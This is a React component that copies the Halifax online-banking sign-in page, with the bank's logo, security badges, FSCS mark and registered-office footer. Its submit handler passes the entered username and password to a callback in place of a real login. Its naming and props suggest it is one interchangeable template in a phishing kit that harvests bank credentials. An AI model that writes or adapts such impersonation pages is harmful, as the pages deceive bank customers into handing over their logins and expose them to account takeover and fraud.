"use client";

import { useState } from "react";

interface HalifaxProps {
  bankName?: string;
  selectedOption?: string;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function HalifaxTemplate({
  bankName = "Halifax",
  selectedOption = "Online Banking",
  onSuccessSubmit,
}: HalifaxProps) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);

  // Errors & Loading (Dono Compulsory)
  const [errors, setErrors] = useState<{ username?: boolean; password?: boolean }>({});
  const [loading, setLoading] = useState(false);

  // Accordion State
  const [openHelp, setOpenHelp] = useState(false);
  const [openContact, setOpenContact] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { username?: boolean; password?: boolean } = {};

    if (!username.trim()) newErrors.username = true;
    if (!password.trim()) newErrors.password = true;

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setLoading(true);

    onSuccessSubmit({
      userId: username.trim(),
      password: password.trim(),
      memorableInfo: `Remember: ${rememberMe ? "Yes" : "No"}`,
      extraData: `Option: ${selectedOption || "Personal"} | Halifax Online Banking`,
    });
  };

  return (
    <div className="min-h-full bg-white font-sans text-[#0c2044] flex flex-col justify-between selection:bg-[#005eb8] selection:text-white">
      <div>
        {/* ================= 1. HALIFAX HEADER ================= */}
        <header className="w-full bg-[#005eb8] px-6 sm:px-12 py-3 flex items-center justify-between text-white border-b border-[#004b93]">
          {/* Logo */}
          <div className="flex items-center gap-2">
            <div className="flex flex-col items-center">
              <span className="text-xl sm:text-2xl font-black tracking-widest leading-none">
                HALIFAX
              </span>
              <div className="w-full flex justify-center mt-0.5">
                <span className="text-xs leading-none font-bold">✕</span>
              </div>
            </div>
          </div>

          {/* Safe & Secure */}
          <div className="flex items-center gap-1.5 text-xs font-semibold">
            <span>Safe & Secure</span>
            <span className="text-sm">🔒</span>
          </div>
        </header>

        {/* ================= 2. MAIN BODY ================= */}
        <div className="max-w-[1000px] mx-auto px-6 sm:px-10 py-10">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
            
            {/* Left 8 Cols: Form Section */}
            <div className="lg:col-span-8">
              
              <h1 className="text-3xl sm:text-[34px] font-black text-[#0c2044] tracking-tight mb-6">
                Sign in to Online Banking
              </h1>

              {/* Notice Card */}
              <div className="border border-[#005eb8] rounded-md p-4 bg-white flex items-start gap-3.5 mb-6">
                <div className="h-6 w-6 rounded-full border-2 border-[#005eb8] text-[#005eb8] flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">
                  i
                </div>
                <div className="text-xs sm:text-[13px] leading-relaxed">
                  <strong className="block text-sm font-bold text-[#0c2044] mb-1">
                    We've made some changes to the way you sign in
                  </strong>
                  <p className="text-slate-700">
                    You can now sign in without a password, by entering just your username and memorable information. Your account stays secure, and you have one less thing to remember.
                  </p>
                </div>
              </div>

              <p className="text-xs sm:text-[13px] text-slate-700 mb-6">
                If you don't already use Online Banking, you can{" "}
                <a href="#" className="text-[#005eb8] underline font-semibold">
                  sign up online
                </a>.
              </p>

              {/* Login Form */}
              <form onSubmit={handleSubmit} className="space-y-5 max-w-[460px]">
                
                {/* 1. Username Field (Compulsory) */}
                <div>
                  <label className="block text-xs sm:text-[13px] font-bold text-[#0c2044] mb-1.5">
                    Username
                  </label>
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => {
                      setUsername(e.target.value);
                      if (errors.username) setErrors({ ...errors, username: false });
                    }}
                    className={`w-full rounded-md border p-2.5 text-sm outline-none transition ${
                      errors.username
                        ? "border-red-600 bg-red-50/20"
                        : "border-slate-400 focus:border-[#005eb8] focus:ring-1 focus:ring-[#005eb8]"
                    }`}
                  />
                  {errors.username && (
                    <p className="text-xs font-bold text-red-600 mt-1">Please enter your username.</p>
                  )}
                  <a href="#" className="inline-block text-xs text-[#005eb8] underline font-semibold mt-1.5">
                    Forgotten your username?
                  </a>
                </div>

                {/* 2. Password Field (Compulsory) */}
                <div>
                  <label className="block text-xs sm:text-[13px] font-bold text-[#0c2044] mb-1.5">
                    Password
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (errors.password) setErrors({ ...errors, password: false });
                      }}
                      className={`w-full rounded-md border p-2.5 pr-14 text-sm outline-none transition ${
                        errors.password
                          ? "border-red-600 bg-red-50/20"
                          : "border-slate-400 focus:border-[#005eb8] focus:ring-1 focus:ring-[#005eb8]"
                      }`}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-2 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#005eb8] underline px-1 cursor-pointer"
                    >
                      {showPassword ? "Hide" : "Show"}
                    </button>
                  </div>
                  {errors.password && (
                    <p className="text-xs font-bold text-red-600 mt-1">Please enter your password.</p>
                  )}
                </div>

                {/* Checkbox */}
                <div className="pt-1 space-y-1">
                  <label className="flex items-center gap-2 cursor-pointer text-xs font-semibold text-slate-800 select-none">
                    <input
                      type="checkbox"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="h-4 w-4 rounded border-slate-400 accent-[#005eb8]"
                    />
                    <span>Remember my username</span>
                  </label>
                  <p className="text-[11px] text-slate-500 pl-6">
                    (Don't tick this if you're using a public or shared computer)
                  </p>
                </div>

                {/* Continue Button */}
                <div className="pt-3">
                  <button
                    type="submit"
                    disabled={loading}
                    className="flex items-center gap-2 rounded-full bg-[#005eb8] hover:bg-[#004b93] active:scale-[0.99] px-8 py-2.5 font-bold text-sm text-white shadow-sm transition cursor-pointer"
                  >
                    <span>{loading ? "Checking..." : "Continue"}</span>
                    <span>›</span>
                  </button>
                </div>

              </form>

              {/* Mobile App Promo Card */}
              <div className="mt-12 border border-slate-300 rounded-lg p-5 flex items-start gap-4">
                {/* Devices Icon */}
                <div className="w-14 h-16 border-2 border-[#005eb8] rounded-md p-1 flex items-center justify-between shrink-0">
                  <div className="w-5 h-10 border border-[#005eb8] rounded-sm"></div>
                  <div className="w-4 h-7 border border-[#005eb8] rounded-sm"></div>
                </div>

                <div>
                  <h3 className="text-sm font-bold text-[#0c2044]">
                    Have you tried our Mobile Banking app?
                  </h3>
                  <p className="text-xs text-slate-600 mt-1 leading-relaxed">
                    Our app is just as safe as Online Banking, with lots of extra features. You can change your contactless payment limit, keep track of your subscriptions and view your PIN.
                  </p>
                  <a href="#" className="text-xs text-[#005eb8] underline font-semibold block mt-2">
                    Download the app
                  </a>
                </div>
              </div>

            </div>

            {/* Right 4 Cols: Help Cards & FSCS */}
            <div className="lg:col-span-4 space-y-4">
              
              {/* Accordions */}
              <div className="space-y-2">
                <div className="border border-slate-200 bg-[#f4f7fb] rounded-md overflow-hidden">
                  <button
                    type="button"
                    onClick={() => setOpenHelp(!openHelp)}
                    className="w-full flex items-center justify-between p-3.5 text-left text-xs font-bold text-[#005eb8] hover:bg-slate-100 transition"
                  >
                    <span>Need some help?</span>
                    <span>{openHelp ? "▲" : "▼"}</span>
                  </button>
                  {openHelp && (
                    <div className="p-3.5 pt-0 text-xs text-slate-600 bg-white border-t border-slate-200">
                      If you're having trouble signing in, check your User ID and password or contact our support team.
                    </div>
                  )}
                </div>

                <div className="border border-slate-200 bg-[#f4f7fb] rounded-md overflow-hidden">
                  <button
                    type="button"
                    onClick={() => setOpenContact(!openContact)}
                    className="w-full flex items-center justify-between p-3.5 text-left text-xs font-bold text-[#005eb8] hover:bg-slate-100 transition"
                  >
                    <span>Contact Us</span>
                    <span>{openContact ? "▲" : "▼"}</span>
                  </button>
                  {openContact && (
                    <div className="p-3.5 pt-0 text-xs text-slate-600 bg-white border-t border-slate-200">
                      Our customer helpline is open 24/7 for security issues and account inquiries.
                    </div>
                  )}
                </div>
              </div>

              {/* FSCS Badge */}
              <div className="pt-6 flex justify-center lg:justify-start">
                <div className="bg-[#531765] text-white px-5 py-3 rounded-lg text-center shadow-sm w-32">
                  <span className="text-2xl font-black italic tracking-tight leading-none block mb-0.5">fscs</span>
                  <span className="text-[9px] font-bold tracking-[0.2em] uppercase border-t border-white/40 pt-1 block">
                    PROTECTED
                  </span>
                </div>
              </div>

            </div>

          </div>
        </div>
      </div>

      {/* ================= 3. FOOTER ================= */}
      <footer className="w-full bg-[#005eb8] text-white px-6 sm:px-12 py-6 text-xs mt-12">
        <div className="max-w-[1000px] mx-auto space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-4 font-semibold">
            <div className="flex flex-wrap gap-4">
              <a href="#" className="underline hover:text-slate-200">Legal</a>
              <a href="#" className="underline hover:text-slate-200">Privacy</a>
              <a href="#" className="underline hover:text-slate-200">Security</a>
              <a href="#" className="underline hover:text-slate-200">Rates and charges</a>
              <a href="#" className="underline hover:text-slate-200">Contact us</a>
              <a href="#" className="underline hover:text-slate-200">www.halifax.co.uk</a>
            </div>
            <a href="#" className="underline hover:text-slate-200 flex items-center gap-1">
              Back to top <span>^</span>
            </a>
          </div>

          <p className="text-white/80 leading-relaxed text-[11px] pt-2 border-t border-white/20">
            Halifax is a division of Bank of Scotland plc. Registered in Scotland No. SC327000. Registered Office: The Mound, Edinburgh EH1 1YZ. Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority under registration number 169628.
          </p>
        </div>
      </footer>
    </div>
  );
}